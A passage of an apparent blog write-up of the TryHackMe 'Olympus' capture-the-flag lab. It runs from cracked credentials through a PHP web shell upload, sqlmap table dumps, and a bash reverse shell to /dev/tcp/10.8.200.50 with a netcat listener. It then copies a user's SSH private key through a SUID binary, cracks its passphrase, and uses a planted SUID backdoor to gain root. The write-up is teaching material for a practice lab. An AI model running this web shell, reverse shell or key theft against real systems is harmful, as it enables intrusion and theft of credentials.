</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably                                              
</span></span><span style=display:flex><span>Session completed.
</span></span></code></pre></div><p>Now we can login with username <code>prometheus</code> and the found password on the chat application (<code>http://chat.olympus.thm</code>).<br>There is an upload functionality, so we upload <code>cmd.php</code> with contents:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>system</span>($_REQUEST[<span style=color:#e6db74>&#39;cmd&#39;</span>]);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>We don&rsquo;t know where the file is uploaded to, so we can run <code>gobuster</code>.</p><ul><li>Command: <code>gobuster dir -u http://chat.olympus.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ gobuster dir -u http://chat.olympus.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>                                                       
</span></span><span style=display:flex><span>Gobuster v3.1.0                                                                                                       
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>                                                         
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>                                                       
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://chat.olympus.thm/                                                                 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET                                                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>50</span>                                                                                       
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt                           
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>                                                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/09/23 00:03:00 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/.htaccess            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 281<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.hta                 <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 281<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.htpasswd            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 281<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/index.php            <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/javascript           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 325<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://chat.olympus.thm/javascript/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/phpmyadmin           <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 281<span style=color:#f92672>]</span>                                           
</span></span><span style=display:flex><span>/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 281<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/static               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 321<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://chat.olympus.thm/static/<span style=color:#f92672>]</span>    
</span></span><span style=display:flex><span>/uploads              <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 322<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://chat.olympus.thm/uploads/<span style=color:#f92672>]</span>   
</span></span><span style=display:flex><span>                                                                                         
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/09/23 00:03:11 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>The file <code>cmd.php</code> should be at <code>http://chat.olympus.thm/uploads/cmd.php</code>, but there was another table called <code>chats</code>, which contains important information: <code>The IT guy used a random file name function to make it harder for attackers to access the uploaded files</code>. So we have to rerun <code>sqlmap</code> in order to view the file name of our uploaded file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sqlmap -u <span style=color:#e6db74>&#34;http://olympus.thm/~webmaster/search.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;search=1337*&amp;submit=&#34;</span> --random-agent -v <span style=color:#ae81ff>3</span> --batch -D  olympus -T chats -C dt,file,msg,uname --dump
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Database: olympus
</span></span><span style=display:flex><span>Table: chats
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>3</span> entries<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+------------+--------------------------------------+-----------------------------------------------------------------
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------+------------+
</span></span><span style=display:flex><span>| dt         | file                                 | msg  
</span></span><span style=display:flex><span>                                                                                                | uname      |
</span></span><span style=display:flex><span>+------------+--------------------------------------+-----------------------------------------------------------------
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------+------------+
</span></span><span style=display:flex><span>| 2022-04-05 | 47c3210d51761686f3af40a875eeaaea.txt | Attached : prometheus_password.txt                              
</span></span><span style=display:flex><span>                                                                                                | prometheus |
</span></span><span style=display:flex><span>| 2022-04-05 | &lt;blank&gt;                              | This looks great! I tested an upload and found the upload folder
</span></span><span style=display:flex><span>, but it seems the filename got changed somehow because I can<span style=color:#e6db74>&#39;t download it back...             | prometheus |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| 2022-04-06 | &lt;blank&gt;                              | I know this is pretty cool. The IT guy used a random file name f
</span></span></span><span style=display:flex><span><span style=color:#e6db74>unction to make it harder for attackers to access the uploaded files. He&#39;</span>s still working on it. | zeus       |
</span></span><span style=display:flex><span>+------------+--------------------------------------+-----------------------------------------------------------------
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------+------------+
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span> 
</span></span><span style=display:flex><span>geobour98@kali:~$ sqlmap -u <span style=color:#e6db74>&#34;http://olympus.thm/~webmaster/search.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;search=1337*&amp;submit=&#34;</span> --random-agent -v <span style=color:#ae81ff>3</span> --batch -D olympus -T chats -C dt,file,msg,uname --dump --flush-session
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Database: olympus                                                                                                     
</span></span><span style=display:flex><span>Table: chats                                                                                                          
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>13</span> entries<span style=color:#f92672>]</span>                                                                                                          
</span></span><span style=display:flex><span>+------------+--------------------------------------+-----------------------------------------------------------------
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------+------------+        
</span></span><span style=display:flex><span>| dt         | file                                 | msg                                                             
</span></span><span style=display:flex><span>                                                                                                | uname      |        
</span></span><span style=display:flex><span>+------------+--------------------------------------+-----------------------------------------------------------------
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------+------------+        
</span></span><span style=display:flex><span>| 2022-04-05 | 47c3210d51761686f3af40a875eeaaea.txt | Attached : prometheus_password.txt                              
</span></span><span style=display:flex><span>                                                                                                | prometheus |        
</span></span><span style=display:flex><span>| 2022-04-05 | &lt;blank&gt;                              | This looks great! I tested an upload and found the upload folder
</span></span><span style=display:flex><span>, but it seems the filename got changed somehow because I can<span style=color:#e6db74>&#39;t download it back...             | prometheus |        
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| 2022-04-06 | &lt;blank&gt;                              | I know this is pretty cool. The IT guy used a random file name f
</span></span></span><span style=display:flex><span><span style=color:#e6db74>unction to make it harder for attackers to access the uploaded files. He&#39;</span>s still working on it. | zeus       |        
</span></span><span style=display:flex><span>| 2022-09-23 | &lt;blank&gt;                              | &lt;blank&gt;                                                         
</span></span><span style=display:flex><span>                                                                                                | prometheus |        
</span></span><span style=display:flex><span>| 2022-09-23 | c892fb409f85b25008b9d49da321df68.php | Attached : cmd.php                                              
</span></span><span style=display:flex><span>                                                                                                | prometheus |        
</span></span><span style=display:flex><span>-------------+--------------------------------------+-----------------------------------------------------------------
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------+------------+
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Now in order to verify code execution navigate to: <code>http://chat.olympus.thm/uploads/c892fb409f85b25008b9d49da321df68.php?cmd=id</code> and the output is: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)</code>.<br>Now we are going to get a reverse shell using Burp Suite. We Intercept the previous request, and execute a bash reverse shell like the following: <code>bash -c 'exec bash -i &>/dev/tcp/10.8.200.50/443 &lt;&1'</code>, but it has to be URL-encoded.<br>The request in Burp should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>GET /uploads/c892fb409f85b25008b9d49da321df68.php?cmd<span style=color:#f92672>=</span>bash+-c+<span style=color:#e6db74>&#39;exec+bash+-i+%26&gt;/dev/tcp/10.8.200.50/443+&lt;%261&#39;</span> HTTP/1.1
</span></span><span style=display:flex><span>Host: chat.olympus.thm
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>lh3nk5s6r2577v8flvr9td45b6
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>Open a netcat listener and we have reverse shell as <code>www-data</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.8.200.50<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.203.170<span style=color:#f92672>]</span> <span style=color:#ae81ff>58780</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>777<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>&lt;ads$ python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>            
</span></span><span style=display:flex><span>www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>geobour98@kali:~$ stty raw -echo;fg
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>  + continued  nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ export TERM<span style=color:#f92672>=</span>xterm-256color
</span></span><span style=display:flex><span>www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ stty rows <span style=color:#ae81ff>38</span> cols <span style=color:#ae81ff>111</span>
</span></span><span style=display:flex><span>www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ whoami
</span></span><span style=display:flex><span>www-data
</span></span><span style=display:flex><span>www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>,7777<span style=color:#f92672>(</span>web<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Then navigate to <code>/home/zeus</code> and open <code>user.flag</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@olympus:/home/zeus$ cat user.flag 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><h3 id=flag-3>Flag 3<a hidden class=anchor aria-hidden=true href=#flag-3>#</a></h3><p>Download <code>linpeas.sh</code> from PEASS-ng github page (<a href=https://github.com/carlospolop/PEASS-ng/releases/tag/20220918>https://github.com/carlospolop/PEASS-ng/releases/tag/20220918</a>) and transfer it to the victim machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@olympus:/dev/shm$ chmod +x linpeas.sh 
</span></span><span style=display:flex><span>www-data@olympus:/dev/shm$ ./linpeas.sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Interesting Files ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê                         
</span></span><span style=display:flex><span>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ SUID - Check easy privesc, exploits and write perms                                                      
</span></span><span style=display:flex><span>‚ïö https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> zeus zeus 18K Apr <span style=color:#ae81ff>18</span> 09:27 /usr/bin/cputils <span style=color:#f92672>(</span>Unknown SUID binary<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>There is an interesting <code>SUID</code> binary (<code>/usr/bin/cputils</code>), that provides <code>copy</code> functionality. In <code>/home/zeus</code> there was a folder <code>.ssh</code>, that should contain the private key of user <code>zeus</code>. So, we can copy it to <code>/dev/shm/</code> and transfer it our machine in order to login as <code>zeus</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@olympus:/dev/shm$ /usr/bin/cputils
</span></span><span style=display:flex><span>  ____ ____        _   _ _     
</span></span><span style=display:flex><span> / ___|  _ <span style=color:#ae81ff>\ </span>_   _| |_<span style=color:#f92672>(</span>_<span style=color:#f92672>)</span> |___ 
</span></span><span style=display:flex><span>| |   | |_<span style=color:#f92672>)</span> | | | | __| | / __|
</span></span><span style=display:flex><span>| |___|  __/| |_| | |_| | <span style=color:#ae81ff>\_</span>_ <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span> <span style=color:#ae81ff>\_</span>___|_|    <span style=color:#ae81ff>\_</span>_,_|<span style=color:#ae81ff>\_</span>_|_|_|___/
</span></span><span style=display:flex><span>                               
</span></span><span style=display:flex><span>Enter the Name of Source File: /home/zeus/.ssh/id_rsa
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Enter the Name of Target File: /dev/shm/id_rsa
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>File copied successfully.
</span></span></code></pre></div><p>The <code>id_rsa</code> is password protected, so we can generate a hash of the file with <code>ssh2john.py</code>, then crack the hash with <code>john</code> and login as <code>zeus</code> with <code>SSH</code>, after modifying the permissions of the <code>id_rsa</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ python /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash
</span></span><span style=display:flex><span>geobour98@kali:~$ john -w<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt id_rsa.hash
</span></span><span style=display:flex><span>Using default input encoding: UTF-8                                                                                   
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>SSH, SSH private key <span style=color:#f92672>[</span>RSA/DSA/EC/OPENSSH 32/64<span style=color:#f92672>])</span>                                              
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>KDF/cipher <span style=color:#f92672>[</span>0<span style=color:#f92672>=</span>MD5/AES 1<span style=color:#f92672>=</span>MD5/3DES 2<span style=color:#f92672>=</span>Bcrypt/AES<span style=color:#f92672>])</span> is <span style=color:#ae81ff>2</span> <span style=color:#66d9ef>for</span> all loaded hashes                                    
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>16</span> <span style=color:#66d9ef>for</span> all loaded hashes                                                                  
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>12</span> OpenMP threads                                                                                            
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status                                                         
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>       <span style=color:#f92672>(</span>id_rsa<span style=color:#f92672>)</span>                                                                                             
</span></span><span style=display:flex><span>1g 0:00:00:13 DONE <span style=color:#f92672>(</span>2022-09-23 13:14<span style=color:#f92672>)</span> 0.07558g/s 116.0p/s 116.0c/s 116.0C/s rachelle..mexico1                         
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably                                              
</span></span><span style=display:flex><span>Session completed.
</span></span><span style=display:flex><span>geobour98@kali:~$ chmod <span style=color:#ae81ff>600</span> id_rsa
</span></span><span style=display:flex><span>geobour98@kali:~$ ssh -i id_rsa zeus@10.10.203.170
</span></span><span style=display:flex><span>Enter passphrase <span style=color:#66d9ef>for</span> key <span style=color:#e6db74>&#39;id_rsa&#39;</span>:                                                                                    
</span></span><span style=display:flex><span>Welcome to Ubuntu 20.04.4 LTS <span style=color:#f92672>(</span>GNU/Linux 5.4.0-109-generic x86_64<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>zeus@olympus:~$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>zeus<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>zeus<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>zeus<span style=color:#f92672>)</span>,4<span style=color:#f92672>(</span>adm<span style=color:#f92672>)</span>,24<span style=color:#f92672>(</span>cdrom<span style=color:#f92672>)</span>,27<span style=color:#f92672>(</span>sudo<span style=color:#f92672>)</span>,30<span style=color:#f92672>(</span>dip<span style=color:#f92672>)</span>,46<span style=color:#f92672>(</span>plugdev<span style=color:#f92672>)</span>   
</span></span></code></pre></div><p>Now we are the user <code>zeus</code>.</p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>There is an interesting folder (<code>0aB44fdS3eDnLkpsz3deGv8TttR4sc</code>) in <code>/var/www/html</code> that user <code>zeus</code> can access, which is owned by <code>root</code>. If we navigate there we see an interesting file <code>VIGQFQFMYOST.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>zeus@olympus:/$ cd /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/                                                      
</span></span><span style=display:flex><span>zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>$suid_bd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/lib/defended/libc.so.99&#34;</span>;                                                                                
</span></span><span style=display:flex><span>$shell <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;uname -a; w; </span>$suid_bd<span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>The file <code>/lib/defended/libc.so.99</code> is <code>SUID</code> binary, and if we execute the <code>strings</code> command we see that it executes <code>/bin/sh</code>, so we can run it to become <code>root</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -la /lib/defended/libc.so.99                            
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>16784</span> Apr <span style=color:#ae81ff>14</span> 10:54 /lib/defended/libc.so.99
</span></span><span style=display:flex><span>zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ strings /lib/defended/libc.so.99
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/bin/sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ /lib/defended/libc.so.99
</span></span><span style=display:flex><span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,4<span style=color:#f92672>(</span>adm<span style=color:#f92672>)</span>,24<span style=color:#f92672>(</span>cdrom<span style=color:#f92672>)</span>,27<span style=color:#f92672>(</span>sudo<span style=color:#f92672>)</span>,30<span style=color:#f92672>(</span>dip<span style=color:#f92672>)</span>,46<span style=color:#f92672>(</span>plugdev<span style=color:#f92672>)</span>,1000<span style=color:#f92672>(</span>zeus<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>We can read now <code>root.flag</code> in <code>/root</code> directory, and there is a hint on the 4th flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#75715e># bash</span>
</span></span><span style=display:flex><span>root@olympus:/root# cat root.flag
</span></span><span style=display:flex><span>                   <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look <span style=color:#66d9ef>for</span> it ;<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                  <span style=color:#f92672>(</span>Hint : regex can be usefull<span style=color:#f92672>)</span>
</span></span></code></pre></div><h3 id=flag-4>Flag 4<a hidden class=anchor aria-hidden=true href=#flag-4>#</a></h3><p>The hint on TryHackMe&rsquo;s page says that the 4th flag is located somewhere in <code>/etc/</code> so we navigate there and use <code>grep</code>, to search recursively and ignore case sensitivity for the string <code>flag{</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>root@olympus:/root# cd /etc/
</span></span><span style=display:flex><span>root@olympus:/etc# grep -Ri <span style=color:#e6db74>&#34;flag{&#34;</span>
</span></span><span style=display:flex><span>ssl/private/.b0nus.fl4g:<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>ssl/private/.b0nus.fl4g:grep -irl flag<span style=color:#f92672>{</span>
</span></span></code></pre></div><p>Proof of Concept (PoC image):
<img src=../../../thm/olympus/olympus.png alt="Olympus photo" style=width:700px;height:300px></p></div><footer class=post-footer><nav class=paginav><a class=prev href=https://geobour98.com/write-ups/thm/jason/><span class=title>¬´ Prev Page</span><br><span>TryHackMe - Jason</span></a>
<a class=next href=https://geobour98.com/write-ups/thm/vulnnetnode/><span class=title>Next Page ¬ª</span><br><span>TryHackMe - VulnNet: Node</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function 